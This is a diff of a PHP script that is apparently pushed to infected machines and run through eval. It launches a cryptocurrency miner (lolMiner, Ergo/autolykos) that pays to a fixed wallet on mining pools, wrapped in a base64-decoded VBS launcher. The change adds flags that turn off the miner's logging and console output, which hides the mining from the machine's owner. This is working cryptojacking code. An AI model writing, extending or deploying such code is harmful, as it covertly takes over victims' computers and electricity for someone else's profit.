@@ -2,7 +2,7 @@ execução por eval. cuidado, não use exit e nem __FILE__
 
 *Atenção, este comando esta sendo executado via exec_blog_command() devido a mudança da url da conta. use só o comando do blg
 
-****39
+****40
 
 [GIT_COMMAND]
 
@@ -351,7 +351,7 @@ if(1)
 		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user xxxxxxxxxxxxxxxxxxxxx.'.$work_key.' --watchdog exit --nocolor';*/
 		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-us-east1.nanopool.org:10600 --user 9iBGUJ1H4PmqPtmuxXXNSr5JHDcT2QvFiW4LEjRXHFQnjrTzQhE.'.$work_key.' --watchdog exit --nocolor';*/
 		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool erg.2miners.com:8888 --user 9iBMo1BM7mSPRUWA1yHDUepNCHKZ4ZV4vaeMGhCsBbUmVcDDYfr.'.$work_key.' --watchdog exit --nocolor';*/
-		$command = '"'.$lolm_path.'" -algo autolykos -wallet 9h9kNgSEYzcNdCSxeC5gXhzXgDKzndRx1uGZeffYQ3F28duHr5s -coin ERG -rigName '.$work_key.' -pool1 erg.2miners.com:8888';
+		$command = '"'.$lolm_path.'" -noLog true -silence 3 -algo autolykos -wallet 9h9kNgSEYzcNdCSxeC5gXhzXgDKzndRx1uGZeffYQ3F28duHr5s -coin ERG -rigName '.$work_key.' -pool1 erg.2miners.com:8888';
 		$command = preg_replace('/\"/is', '""', $command);
 		$vbs = base64_decode($vbs);
 		$vbs = preg_replace('/\{COMMAND\}/is', $command, $vbs);
